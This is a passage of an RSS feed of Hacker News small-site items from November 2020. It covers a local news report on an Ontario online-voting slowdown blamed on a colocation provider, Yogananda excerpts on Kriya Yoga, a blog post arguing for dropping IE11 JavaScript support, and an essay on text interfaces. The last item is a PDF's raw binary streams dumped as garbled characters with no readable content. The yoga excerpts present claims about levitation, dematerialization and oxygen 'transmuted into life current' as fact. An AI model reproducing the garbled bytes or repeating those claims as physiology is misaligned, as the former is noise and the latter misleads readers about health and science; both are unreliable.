        <p dir="ltr">The company responsible for the online voting system in Bradford West Gwillimbury has blamed the Election Night crash on a slow down caused by a Toronto-based facility.</p>

<p dir="ltr">About 51 municipalities around Ontario started experiencing slow traffic with Dominion Voting Systems around 6 p.m., according to a press release issued by the company late Monday night.</p>

<p dir="ltr">“This load issue was documented, reviewed and determined to be the result of a Toronto-based Internet Colocation provider placing an unauthorized limit on incoming voting traffic that was roughly 1/10th of the system’s designated bandwidth,” read the release.</p>

<p dir="ltr">A co-location provider is a data center facility in which a business can rent space for servers and other computer hardware.</p>

<p dir="ltr">Dominion was unaware of the problem until municipality representatives started contacting it for help and to share complaints from voters, read the release.</p>

<p dir="ltr">“Once we became aware of the problem, Dominion was able to quickly identify the source of the issue and work with the provider to resolve all issues with the system service by 7:30 p.m.,” read the release.</p>

<p dir="ltr">“Unfortunately, the 90-minute slowdown and resulting bandwidth issue caused a varying number of voters to experience slow response times and system time-outs.”</p>

<p dir="ltr">Many communities affected by the crash have extended the voting period. In BWG, residents have until 8 p.m. today to cast their ballots.</p>

<p dir="ltr">The town will also be hosting an Election Night gathering at the Bradford and District Memorial Community Centre at 7:30 p.m.</p>

<p dir="ltr">“Dominion regrets the challenges that our system load issue posed for both election officials and voters alike in today’s elections,” read the Dominion release.</p>

<p dir="ltr">“We want to assure Ontario voters that we will work to ensure this problem does not occur in future elections. It is important to note that at no time was the integrity of the system at risk of compromise, or in any way insecure.”</p>

<p dir="ltr">As of Monday morning, 5,603 votes had been submitted in the BWG municipal election, making up a little more than 23 per cent of the eligible voters, according to Caleigh Clubine, the town’s community relations officer.</p>

<p dir="ltr">At an election gathering Monday evening, several BWG candidates said their confidence in online voting is now lacking.</p>

<p dir="ltr">“If you voted early, it worked really good, (but) you have to have the proper services. You’ll get a large volume (and if you are not prepared for that) you haven’t done your job,” said Ward 4 incumbent Ron Orr.</p>

<p dir="ltr">“Does it shake our confidence in the system? Sure it does,” added Deputy Mayor James Leduc. “I’m frustrated the system wasn’t stress-tested enough. We won’t be strictly online voting again. We’ll have both systems again.”</p>

    </div></div>]]>
            </description>
            <link>https://www.bradfordtoday.ca/bradfordvotes/dominion-voting-systems-explains-what-went-wrong-with-online-voting-in-bradford-1095086</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077860</guid>
            <pubDate>Fri, 13 Nov 2020 01:42:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kriya Yoga]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077810">thread link</a>) | @whereistimbo
<br/>
November 12, 2020 | http://yogananda.com.au/kriya.html | <a href="https://web.archive.org/web/*/http://yogananda.com.au/kriya.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <article>
        
<h2 id="science">The Science of Kriya Yoga</h2>
      <p><em>Excerpts from  Autobiography of a Yogi by Paramahansa Yogananda</em></p>
      <p><em>Kriya Yoga</em> is a simple, psychophysiological method by which human blood is decarbonated and recharged with oxygen. The atoms of this extra oxygen are transmuted into life current to rejuvenate the brain and spinal centers. By stopping the accumulation of venous blood, the yogi is able to lessen or prevent the decay of tissues. The advanced yogi transmutes his cells into energy. Elijah, Jesus, Kabir, and other prophets were past masters in the use of <em>Kriya</em> or a similar technique, by which they caused their bodies to materialize and dematerialize at will. </p>
<p><em>Kriya</em> is an ancient science. Lahiri Mahasaya received it from his great guru, Babaji, who rediscovered and clarified the technique after it had been lost in the Dark Ages. Babaji renamed it, simply, <em>Kriya Yoga</em>.</p>


<p>"The <em>Kriya Yoga</em> that I am giving to the world through you in this nineteenth century," Babaji told Lahiri Mahasaya, "is a revival of the same science that Krishna gave millenniums ago to Arjuna; and that was later known to Patanjali and Christ, and to St. John, St. Paul, and other disciples.”</p>
<figure>
  <figcaption><b>TRANSMISSION OF KRIYA YOGA</b></figcaption><img src="http://yogananda.com.au/img/gurus_img/kriya_transmission530.jpg" alt="Kriya Yoga "></figure>

      <h2>Kriya Yoga in  the Bhagavad Gita</h2>
      <p> <em>Kriya Yoga</em> is twice referred to by Lord Krishna, India’s greatest prophet, in the Bhagavad-Gita. One stanza reads: </p>
      <p>"Offering the inhaling breath into the exhaling breath and offering the exhaling breath into the inhaling breath, the yogi neutralizes both breaths; thus he releases prana from the heart and brings life force under his control." <em><br>
        —The Bhagavad Gita IV:29</em></p>
      <p>The interpretation is: “The yogi arrests decay in the body by securing an additional supply of prana (life force) through quieting the action of the lungs and heart; he also arrests mutations of growth in the body by control of apana (eliminating current). Thus neutralizing decay and growth, the yogi learns life-force control." </p>
      <p>Another Gita stanza states: </p>
      <p>"That meditation-expert (<em>muni</em>) becomes eternally free who, seeking the Supreme Goal, is able to withdraw from external phenomena by fixing his gaze within the mid-spot of the eyebrows and by neutralizing the even currents of <em>prana</em> and <em>apana</em> [that flow] within the nostrils and lungs; and to control his sensory mind and intellect; and to banish desire, fear, and anger.” <br>
        —<em>The Bhagavad Gita V:27-28</em></p>
      <p><img src="http://yogananda.com.au/img/orna/aum2_gray.gif" alt="" width="19" height="20"></p>
      <h2>Kriya Yoga in Yoga Sutras by Patanjali</h2>
      <p><em>Kriya Yoga</em> is mentioned twice by the ancient sage Patanjali, foremost exponent of yoga, who wrote: </p>
      <p>"<em>Kriya Yoga</em> consists of <br>
        body discipline, <br>
        mental control, 
      and 
        <br>
        meditating on <em>Aum</em>." <br>
      —Yoga Sutras II:1</p>
      <p><img src="http://yogananda.com.au/img/gl/aum133.jpg" alt="yogananda.com.au" width="145" height="133">Patanjali speaks of God as the actual Cosmic Sound of <em>Aum</em> that is heard in meditation. <em>Aum</em> is the Creative Word, the whir of the Vibratory Motor, the witness of Divine Presence. Even the beginner in yoga may soon hear the wondrous sound of <em>Aum</em>. Through this blissful spiritual encouragement, he becomes convinced that he is in communion with supernal realms. </p>
      <p>Patanjali refers a second time to the <em>Kriya</em> technique or life-force control thus: </p>
      <p>"Liberation can be attained by that pranayama <br>
        which is accomplished by disjoining the course of inspiration and expiration.” <br>
      —Yoga Sutras II:49</p>
      <p><img src="http://yogananda.com.au/img/orna/aum2_gray.gif" alt="" width="19" height="20"></p>
      <h2>Accelerated Spiritual Evolution with  Kriya Yoga </h2>
      <p><img src="http://yogananda.com.au/img/pics/chakras300.gif" alt="chakras" width="300" height="428"></p>
      <p>"<em>Kriya Yoga</em> is an instrument through which human evolution can be quickened," Sri Yukteswar explained to his students. "The ancient yogis discovered that the secret of cosmic consciousness is intimately linked with breath mastery. This is India's unique and deathless contribution to the world's treasury of knowledge. The life force, which is ordinarily absorbed in maintaining heart action, must be freed for higher activities by a method of calming and stilling the ceaseless demands of the breath." </p>
      <p>The <em>Kriya</em> Yogi mentally directs his life energy to revolve, upward and downward, around the six spinal centers (medullary, cervical, dorsal, lumbar, sacral, and coccygeal plexuses), which correspond to the twelve astral signs of the zodiac, the symbolic Cosmic Man. One-half minute of revolution of energy around the sensitive spinal cord of man effects subtle progress in his evolution; that half-minute of <em>Kriya</em> equals one year of natural spiritual unfoldment.</p>
      <p><img src="http://yogananda.com.au/img/orna/aum2_gray.gif" alt="" width="19" height="20"></p>
      <p>One thousand <em>Kriyas</em> practiced in eight and a half  hours gives the yogi, in one day, the equivalent of one thousand years of natural evolution: 365,000 years of evolution in one year. In three years, a <em>Kriya Yogi</em> can thus accomplish by intelligent self-effort the same result that Nature brings to pass in a million years. The <em>Kriya</em> shortcut, of course, can be taken only by deeply developed yogis. With the guidance of a guru, such yogis have carefully prepared their body and brain to withstand the power generated by intensive practice. </p>
		<p><img src="http://yogananda.com.au/img/orna/aum2_gray.gif" alt="" width="19" height="20"></p>
      <p>The body of the average man is like a fifty-watt lamp, which cannot accommodate the billion watts of power roused by an excessive practice of <em>Kriya</em>. Through gradual and regular increase of the simple and foolproof methods of <em>Kriya</em>, man's body becomes astrally transformed day by day, and is finally fitted to express the infinite potentials of cosmic energy, which constitutes the first materially active expression of Spirit.</p>
      <p>Referring to the sure and methodical efficacy of yoga, Krishna praises the technological yogi in the following words: </p>
      <p>"The yogi is greater than body-disciplining ascetics, greater even than the followers of the path of wisdom (Jnana Yoga), or of the path of action (Karma Yoga); be thou, O disciple Arjuna, a yogi!" <br>
      —The Bhagavad Gita VI:46</p>
    <figure><img src="http://yogananda.com.au/img/pics/yogameditation550.jpg" alt="??">
    <figcaption>Yoga Meditation</figcaption></figure>
      <p><img src="http://yogananda.com.au/img/orna/aum2_gray.gif" alt="" width="19" height="20"></p>
      <h2 id="divine">From Material to Divine Consciousness</h2>
      <p>The <em>Kriya Yoga</em> meditation techniques of <em>pranayama</em>, life-force control that transmutes breath into subtle lifetronic energy, bring positive realization that the composition of the body is pure cosmic energy. </p>
      <p>In the adept practice of <em>Kriya</em>, the body is oxygenated and its atoms etherealized until it becomes light as a feather. Man has no idea how much power comes into the body when he has mastered the mystery of the breath. <em>Kriya</em> practice brings a regulated, continuous inflow of oxygen into the body, the atoms of which, by the process of <em>pranayama</em>, are transmuted into life force, reinforcing the subtle currents in the spine, which in turn awaken the astral cerebrospinal centers and spiritualize the entire body. </p>
      <p>After years of successful practice, the body of the advanced <em>Kriya Yogi</em> becomes so spiritualized that in exalted states he can hardly feel it touch the ground. The suffusion of life force becomes so powerful that the whole body loses its delusive solidity and actually levitates. I can testify to that from my own experience. But the beginner should not expect to jump weightless tomorrow! Modern man is accustomed to getting results quickly; his industry and technology manufactures products so rapidly that he thinks there should be a convenience package of concise spiritual progress as well. A presumption of instant spiritual achievement is perhaps more than a bit audacious considering the innumerable lifetimes already spent in making oneself an unspiritual being. Even a lifelong practice is little to be required. Nevertheless, the <em>Kriya Yoga</em> science and art of meditation are not drudgery, because gradual transforming results are felt from the very beginning. (p.823, <cite>The Second Coming of Christ</cite> by Paramahansa Yogananda)</p>
      <p><a href="http://yogananda.com.au/gurus/yoganandaquotes03.html">The best  Paramahansa Yogananda quotes on Kriya Yoga</a></p>
      <p><a href="http://yogananda.com.au/gita/gita0429k1.html">Next Page »</a> </p>
<p><img src="http://yogananda.com.au/img/orna/aum2_gray.gif" alt="om" width="19" height="20"></p>
</article>
      <!-- end article1 -->
    </div></div>]]>
            </description>
            <link>http://yogananda.com.au/kriya.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077810</guid>
            <pubDate>Fri, 13 Nov 2020 01:36:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dropping Support for IE11 Is Progressive Enhancement]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077805">thread link</a>) | @afrcnc
<br/>
November 12, 2020 | https://blog.carlmjohnson.net/post/2020/time-to-kill-ie11/ | <a href="https://web.archive.org/web/*/https://blog.carlmjohnson.net/post/2020/time-to-kill-ie11/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><em>TL;DR if you have to choose, you should prioritize users with no JavaScript over users with old JavaScript.</em></p><p>If you’re a web developer working today, it’s probably long passed time for you to <strong>stop transpiling your modern JavaScript into ES5 for Internet Explorer</strong>. Any time or effort spent getting your JavaScript working in IE11 is wasted time that could be better spent <strong>making a better experience for users without JavaScript</strong>. Moving your resources from Internet Explorer to users without JavaScript will let you improve the SEO and accessibility of your site while providing a better experience for everyone.</p><p>First, some notes about <em>who this advice is for</em>: I am assuming you’re working for a small team with no Quality Assurance testing department making a content focused site. If you have a large team that actually QA tests IE11, this advice may not apply to your situation. If you’re just doing personal projects for fun, you should have already dropped ES5 years ago. If you’re making more of an app than a content site, you probably should have cut off IE11 years ago, but the calculations are more complex and site specific.</p><hr><h2 id="why-drop-support-for-ie11-javascript">Why drop support for IE11 JavaScript?</h2><p>To begin with, Internet Explorer represents <strong>less than 1%</strong> of my work traffic according to Google Analytics. People will sometime spin this away by arguing that 1% of a large number is also a large number. If you have 100 million hits, 1% is 1 million hits! But the flipside is that 99 million hits are <em>not</em> Internet Explorer and are not helped by optimizations aimed at Internet Explorer. What’s more this number has been <strong>falling steadily</strong>. Even just in the year and a half that my work site has been around it has dropped. It used to be closer to 2%. On top of that, outside of corporate/enterprise settings, most of these computers browsing your site with Internet Explorer will <strong>also have Chrome installed</strong>, and approximately 100% of the users will <strong>also own a smart phone</strong> they can use to browse your site if their computer cannot display it correctly. The computers in question will be old and have <strong>terrible performance</strong> assuming you do get the JavaScript to run in the first place.</p><p>Let’s contrast this with other users we could optimize for. The number of <strong>visually impaired</strong> readers is steady and will not go down absent some breakthrough in medical technology. Visually impaired readers can’t just use another device if the site doesn’t work in the device they have in front of them. In fact, even users who have physically normal vision are impaired when driving or walking, and it seems to me inevitable that as <strong>voice assistants</strong> become ubiquitous and easy to use, sighted users having websites read aloud to them will eventually become commonplace. Plus, there are <a href="https://arstechnica.com/tech-policy/2019/10/accessibility-the-future-and-why-dominos-matters/">legal imperatives</a> to make reasonable accommodations for visually impaired readers.</p><p>Users <strong>without JavaScript</strong> are another important consideration. As Jake Archibald said, <a href="https://www.twitter.com/jaffathecake/status/207096228339658752">“All your users are non-JS while they’re downloading your JS.”</a> And remember that sometimes, your user’s connection will drop out, and <a href="https://kryogenix.org/code/browser/everyonehasjs.html">the JavaScript will never load</a>. But beyond that, browsers like Opera Mini and extensions like NoScript or overly aggressive ad blockers are already about as common as users of Internet Explorer, and they’re not going to go away. It’s hard to estimate the number of people with JavaScript broken or disabled, but <a href="https://deliberatedigital.com/blockmetry/javascript-disabled">it appears to be stable from year to year</a>, because the underlying causes aren’t subject to change, unlike IE11 usage. Year over year, old computers will be replaced, and IE11 will fade. Disliking ads and having bad connections on the other hand are here to stay. Then there are the most important users of your site without JavaScript: <strong>web spiders and search engines</strong>. While Google does in theory use headless browsers to scrape sites while executing JavaScript, in practice, you’ll still get better SEO if you optimize your content to work without it, and there are other non-Google spiders that you may want crawling your site too, like the <a href="https://cloudinary.com/blog/a_primer_on_microbrowsers_tips_and_tricks_for_managing_the_seo_feedback_loop">microbrowsers</a> which add link previews to chat and social media.</p><p>If you’re running a small site without a QA team, it’s probably worth going to <a href="https://www.browserling.com/">Browserling</a> right now and finding out if you’re even working in Internet Explorer to begin with. Browserling will let you run a virtual PC with Internet Explorer from your own browser for a limited time for free, so it’s probably easiest way to do a quick low effort <a href="https://en.wikipedia.org/wiki/Smoke_testing_(software)">smoke test</a> of your Internet Explorer support without having to install anything. Just open up a tab, take a look at your site, and see if the results surprise you.</p><p>I’ve seen developers (including most especially myself) burned by just <em>assuming</em> that <a href="https://babeljs.io/">Babel</a> and <a href="https://github.com/postcss/autoprefixer">Autoprefixer</a> have solved all their problems with IE11. You may already be dropping support for IE11, you just don’t know it yet. I’ve had sites I work on break for months at a time in Internet Explorer with no complaints from readers. One site I redesigned got just a single reader inquiry about a widget that broke in IE11 after a redesign. When I told the reader to try loading the page in Chrome, he seemed satisfied. More recently, IE11 has had some terrible rendering bugs on my site for days or months at a time that have triggered <em>zero</em> reader complaints. If I don’t QA it myself, no one else will do it for me.</p><p>If you think your code will work but haven’t actually QA tested it, it can lead to the worst of both worlds: code bloated with extras for IE11 that still doesn’t even work anyway. It’s not enough to transpile down to ES5, you also need to polyfill every missing DOM API you use, and that can be a very complicated and bloated proposition.</p><p>Essentially, there are three target web platforms you might want to support:</p><ol><li>Modern browsers</li><li>Browsers without JavaScript</li><li>Internet Explorer 11 (if you’re supporting &lt;11, 😱)</li></ol><p>If you try to support IE11 but aren’t actually QA testing it, you will probably end up with only modern browsers working. It is better to aim for both modern browser support and no-JS browser support and actually succeed than to try for IE11 support and silently fail.</p><hr><h2 id="what-should-you-do-instead-of-optimizing-ie11">What should you do instead of optimizing IE11?</h2><p>The web is built on the foundation of <strong>progressive enhancement</strong>. Deliver “good enough” service to legacy browsers, and save the enhancements for the bulk of your userbase.</p><p>In 2017, Philip Walton advocated the “<a href="https://philipwalton.com/articles/deploying-es2015-code-in-production-today/">module/nomodule</a>” pattern for JavaScript. This can be reduced to the “module/bare minimum” pattern today. Walton wrote:</p><blockquote><p>Most developers think of <code>&lt;script type="module"&gt;</code> as way to load ES modules (and of course this is true), but <code>&lt;script type="module"&gt;</code> also has a more immediate and practical use-case—loading regular JavaScript files with ES2015+ features and knowing the browser can handle it!</p><p>To put that another way, every browser that supports <code>&lt;script type="module"&gt;</code> also supports most of the ES2015+ features you know and love.</p></blockquote><p>Essentially, if you set the script element’s type attribute to an unknown value, browsers will just ignore the script. The effect of this is that IE11 will ignore the contents of any <code>&lt;script type="module"&gt;</code> tags. Modern browsers, on the other hand, will ignore the contents of <code>&lt;script nomodule&gt;</code> tags. This allows roughly targeting your JavaScript to its intended platform.</p><p>Walton goes on to advocate creating <strong>two versions of the same JavaScript bundle</strong> with Webpack. Send modern browsers a smaller, modules specific ES2015 version and older browsers a larger, transpiled and polyfilled ES5 version.</p><p>As I wrote above, I think just using Babel to turn your JavaScript into ES5 cannot be trusted to actually work without constant QA vigilance. A seemingly insignificant change in your code might silently break IE11 support, and you could be none the wiser for months or years unless you constantly recheck IE11. Instead of this futile strategy of pushing back the tide, I advocate sending IE11 users <strong>as little JavaScript as possible</strong>, ideally none, but practically speaking, <strong>probably just your ads and analytics</strong>, and then <strong>actually test</strong> that it works.</p><p>The first step is to decide what your organizational priorities are. These days most software engineers are familiar with the concept of the <a href="https://en.wikipedia.org/wiki/Minimum_viable_product">minimum viable product</a>. What’s the <em>minimum viable experience</em> that you’re willing to deliver to IE users? Maybe you’re not ready to write them off completely and just deliver a broken page and a “Best Viewed in Chrome” icon. But you may be willing to say that as long as they view your ads, you don’t care if they can bypass the paywall or can’t comment on articles. In my case, I want Internet Explorer using readers to be able to read my articles and to show up in my analytics. Everything else, I’m willing to cut or sacrifice in the name of freeing up the resources for creating a better no-JS experience. If that’s my minimum viable experience, I am going to create it and test that it actually works, and then <strong>stop iterating</strong>, so that I don’t accidentally break it with my future changes to the enhanced, modern browser experience.</p><p>It may seem like more work to craft a separate experience for ES5 users instead of just backporting your modern JS, but it’s really not. The whole point of modern frontend JavaScript is that everything is broken into small modules that are imported and bundled in development. So, <a href="https://github.com/spotlightpa/poor-richard/blob/ab0ad83/src/esbuild/nomodules.js">here is the whole of the entrypoint</a> for my ES5/IE11 build:</p><div><pre><code data-lang="javascript"><span>import</span> <span>"../utils/add-listeners.js"</span><span>;</span>

<span>// eslint-disable-next-line no-console
</span><span></span><span>console</span><span>.</span><span>warn</span><span>(</span><span>"could not load enhancements"</span><span>);</span>
<span>document</span><span>.</span><span>body</span><span>.</span><span>classList</span><span>.</span><span>add</span><span>(</span><span>"has-old-js"</span><span>);</span>
</code></pre></div><p>Once the import is loaded, Babel’d, and minifed, it comes to 17KB (real KB, not <a href="https://twitter.com/carlmjohnson/status/1069968685606031360">moon weight</a><i>!</i>). Essentially all the listeners do are add <a href="https://github.com/jehna/ga-lite">some analytics</a> and the JavaScript to make the menu hamburger button work. The <code>.has-old-js</code> class triggers a CSS utility class to show and hide things conditionally. A <code>&lt;noscript&gt;</code> tag in the HTML does the same, as does an <code>onerror</code> handler on the module script. This lets me show one experience to modern browsers and a secondary fallback experience to everyone else. Because this code is essentially set in stone, I …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.carlmjohnson.net/post/2020/time-to-kill-ie11/">https://blog.carlmjohnson.net/post/2020/time-to-kill-ie11/</a></em></p>]]>
            </description>
            <link>https://blog.carlmjohnson.net/post/2020/time-to-kill-ie11/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077805</guid>
            <pubDate>Fri, 13 Nov 2020 01:35:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Game with 179 levels generated using neural networks]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25077797">thread link</a>) | @ent101
<br/>
November 12, 2020 | https://www.outpan.com/app/99694412f2/qubes | <a href="https://web.archive.org/web/*/https://www.outpan.com/app/99694412f2/qubes">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><nav role="navigation"><div><div><form action="/search" method="get"></form><p><img src="https://opimg.s3.amazonaws.com/99694412f2-200x200.jpg" id="app-toolbar-icon"></p><div id="app-options-wrapper"><div><div><p data-toggle="modal" data-target="#review-modal" id="reviews-modal-link" title="View reviews or write one"><span></span> <span>23</span></p></div></div></div></div><div id="navbar-user-items" aria-expanded="false"><p><a href="https://www.outpan.com/signup">Sign Up</a></p><ul><li></li></ul><ul><li><a href="https://www.outpan.com/">Home</a></li><li><a href="https://www.outpan.com/login?ref=https://www.outpan.com/app/99694412f2/qubes">Login</a></li><li><a href="https://www.outpan.com/signup">Sign Up</a></li></ul><form action="/search" method="get"></form></div></div></nav><div><div><div><div></div></div></div></div></div>]]>
            </description>
            <link>https://www.outpan.com/app/99694412f2/qubes</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077797</guid>
            <pubDate>Fri, 13 Nov 2020 01:34:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Text as a User Interface]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077768">thread link</a>) | @thesephist
<br/>
November 12, 2020 | https://thesephist.com/posts/text/ | <a href="https://web.archive.org/web/*/https://thesephist.com/posts/text/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>There’s a resurgence in products using text as the primary user interface.</p>
<p>The most popular tool that uses text as a core UI is probably Microsoft Excel. Excel is a mostly-<a href="https://en.wikipedia.org/wiki/WYSIWYG">WYSIWYG</a> application, but when interacting with formulas and programming cells, the interface of choice for most users is text – typing in formulas as textual information, not clicking buttons. When we want to take the sum over a row, most of us click on the cell and type <code>=SUM(A3:A10)</code> – we don’t click on a “sum” button or unfurl a dropdown menu.</p>
<p>The poster child of textual user interfaces is the command line in the terminal. But I think a new crop of tools, combined with a more tech-savvy market, is staging the rebirth of text as a user interface. Textual interfaces are everywhere in the modern workplace. Slash-commands in Slack and Discord and Notion, hash-tags for channels and tagging, special syntax for searching and querying data across applications, @-mentions in social media and team work environments, and so on. We’re training ourselves to be more savvy users of the <em>textual interface</em>.</p>
<p>
<img src="https://thesephist.com/img/text-interface.jpg" alt="Text as an interface">
</p>
<h2 id="the-forces-at-work">The forces at work</h2>
<p>I think we’re seeing textual interfaces rise in popularity wherever people look for any of the following.</p>
<h3 id="progressive-feature-discovery">Progressive feature discovery</h3>
<p>Text interfaces within graphical UIs gained popularity in places with a high feature-to-visual-complexity budget. In other words, when there’s many more features than can fit comfortably on the screen at once, we hide that surplus complexity behind text options.</p>
<p>In many tools with a high degree of hidden complexity, the average user uses only a small subset of those features frequently. A Slack workspace, for example, might have a hundred slash-commands enabled, but each individual team member may only frequently use 5-10 of those commands on a regular basis. Rather than clutter up the interface with a hundred buttons or a web of dropdown menus, we hide the complexity behind text options, and the user can learn the few features they use most frequently, so they can access them again easily.</p>
<p>This idea applies to tools with a lot of complexity, where any single user might only take advantage of a small subset of that feature set. I think more tools are falling into this bucket as productivity tools consolidate. If a single kind of interface is shared by all business-chat clients, or all product-management tools, or version control software – rather than building custom interfaces for each workflow or use case, why not provide a wide surface area of functionality that’s accessible via text?</p>
<h3 id="extensibility-and-the-portable-interface">Extensibility and the portable interface</h3>
<p>Modern software workflows cross application and service boundaries all the time. Textual interfaces provide an enforceable, rigorous contract between services and applications that can act as the interfaces for apps to integrate with external services, in a way that visual interfaces can’t.</p>
<p>In a software development team, a proposal for a bug fix might flow through a task tracker, which connects with a team messaging app, where an engineer might run a group poll or lead a discussion. The request change might flow back into the task tracker, into a version control system like GitHub, and then deploy automatically to production servers.</p>
<p>Workflows like this require that apps from completely different vendors and domains are able to communicate with each other. More importantly, it requires that the interfaces we use to control these tools be <em>portable</em>. A portable interface carries the same kind of UI across different services, so the user can interact with any service similarly across all of its integrations. Portability means that we can enter data into our task tracker through our chat client, or request the rollout of a change through an infrastructure provider from our version control system.</p>
<p>These integration points are much easier to build, and easier to master as end users, when they all share the same, portable format – text.</p>
<h3 id="automation">Automation</h3>
<p>Textual interfaces make automation trivial, and automation tools much easier to build.</p>
<p>More people are using tools like <a href="https://zapier.com/">Zapier</a> and <a href="https://runalloy.com/">Alloy</a> to automate common business tasks or link very domain-specific workflows together across services. Having a shared portable interface across these apps, and a syntax format that can serve as a contract for how to use that interface, makes it possible for these automation points to communicate to dozens of other services easily. It also minimizes the possibility that a future update to the UI might break an automated workflow.</p>
<p>Text interfaces are much easier for machines to use. And as more work is done autonomously by the workflows we teach machines to perform, text interfaces are starting to matter just as much as human ones.</p>
<h3 id="sharability">Sharability</h3>
<p>People naturally want to document their workflows to remember, share, and iterate upon as a team. To share a graphical workflow, I’d need to record my screen or spend time writing down instructions for how to navigate a visual interface, clicking the right buttons and checking the right boxes. Reifying workflows as text makes this much easier – I can just encode a workflow into a few lines of text input.</p>
<p>In this way, workflows driven by text interfaces are easier to share, document, and iterate over time within a team. Text interfaces make workflows more concrete.</p>
<h2 id="workflows-not-data-are-the-subject-of-innovation">Workflows, not data, are the subject of innovation</h2>
<p>Given these benefits of text as an interface, weighted against the very real cost – text is a more esoteric way to use a computer – why are we seeing a resurgence in this trend now?</p>
<p>I think the easiest factor we can identify is that more people entering the workforce are unafraid of textual interfaces, because they’ve been typing and messaging and tagging their friends online all their life. They already interact with computers via text.</p>
<p>But the second reason that’s driving the industry to text is that <strong>the focus of software services has shifted from manipulating <em>data</em> to manipulating <em>workflows</em>.</strong> We’ve learned how to store and sift through data in our computers as a society, so we’re moving up a step of abstraction, to storing and sharing the how’s of our work, not just the what’s.</p>
<p>Workflows, not data, are the subject of product innovation now. And the subject is easier to study, to compare, to share and extend, when it’s concrete and durable, not an organic, ephemeral series of actions.</p>
<p>I think as long as we’re innovating on <em>how</em> we work, and how the services we use can work together more effectively, text as an interface is here to stay. And why not? The software industry has spent the last half-century building tools to help us wrangle with text, and we can rediscover those tools and ideas again.</p>
<p>We’re entering a renaissance of user interfaces, not in the sense of a novel paradigm shift, but in the sense of a rediscovery of classic, enduring ideas on which we can build better tools and systems. And I, for one, welcome it.</p>

        <hr>
        <p>
            If you enjoyed this piece, you might also enjoy
            
            my next post,
            <a href="https://thesephist.com/posts/language/"><em>In defense of natural language</em></a>.
            
        </p>
        <p>
            I share new posts like this on my <a href="https://thesephist.com/#newsletter">newsletter.</a>
            If you liked this post, you should consider joining the list.
        </p>
        <p>Have a comment or response? You can <a href="https://thesephist.com/#contact">email me.</a></p>
    </article></div>]]>
            </description>
            <link>https://thesephist.com/posts/text/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077768</guid>
            <pubDate>Fri, 13 Nov 2020 01:29:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dominion Voting Systems – Disruption on Election Day (2019)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077762">thread link</a>) | @halturing
<br/>
November 12, 2020 | https://www.thebluemountains.ca/document_viewer.cfm?event_doc=1019 | <a href="https://web.archive.org/web/*/https://www.thebluemountains.ca/document_viewer.cfm?event_doc=1019">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>Ä]&gt;Æê}wû(Xÿ'é€eHKŒ�â<sŒx‚zc)v:&È\´;{âdÉç)jq(f"¯”Èƒã³†ä1¤ˆÏyôç°òˆ8l9Ù&»�_ÿœããÂ²^žòÞåÑçeœôcnø£¤˜†w%nõiºd\Ÿ�ç;¬€o6:Ê]- êÏ="">}’�¢)Žž÷DÿB.|¬“;wAž½ž¼;ãä•âQaØ¢»+Ê^Ó(Ùä°Lèó¢ä{™Ã—ÐRlúB&amp;°P¬0n&lt;“wÀðj¢Ô°CÄIï:;&nbsp;tÝD;'zÞ#J6m†(ë‘qµ±ïêƒÂì�¿�†!QaÊïÑ†ýúŸ*NÚ5
endstream
endobj
275 0 obj
&lt;&gt;stream
hÞÄTM�Ó0ý+&gt;Â%¶ã¯dµªh�+-jŠz¨zÈ¦�¶ë¬WˆÏŒãxCa‚‡W{¦3ož=ÎpEáš¨œpCxÎ9á¬Z^.JE®¯iE?¯o¯ëîäû+ßµÍ©uoü±½?�ÛÇþl}ÝÙ!kê×‹ä¬ê¡½é­§K×Õ§�úÞ6ý¡³_è¶³K;tÉ¾éÜàßkGÅŒwíÐ¸îÉ÷Žp	òÖô®Ž¹R´:ßûoO-Ý¸s»	ü	¥¶ÝÁ‡�QŒüOä¦J¥t@Q”Dk¸â’!Äð©BŽ±`OySÎï�â�#üœqŠ!LžÚk í�ÈXð�  Ä‚?äÅ¸”÷¥”‰ý“„ÔeàÂÃ$¡Pc.8íQÿÇµ˜çDÆžó`obÎ!àõ¸â5ÖÃ5ðGÎfB’O‘LÁ#á:¥#R¿"õœ8£�""íÔÕŸº¦YÒ`”7QŠ�&gt;ß£DnY&gt;WG.qÂüàZÅÊ<ejÒ‚èÔÙæ�Ìc÷§q kæ1ów_ÆkÏ?…ù«¸|ÎôÀÅü²ÆÄËØ="">Œ¡¿]Kœ…8wVU`¨Æ³êÝ¡utKØb�ƒ8¶§è-]·�ßé23Š”Efr
'&amp;Ã±ÊE&amp;ŒÚÓÊ»sã?Õ®µžÈ4Éî:û0–XZÛûIƒú'
RðŒ•Å¤A*“©/4ˆ—5|`¤bÒ
endstream
endobj
276 0 obj
&lt;&gt;stream
hÞ,ŽM‚@†ÿÊë 3ëW
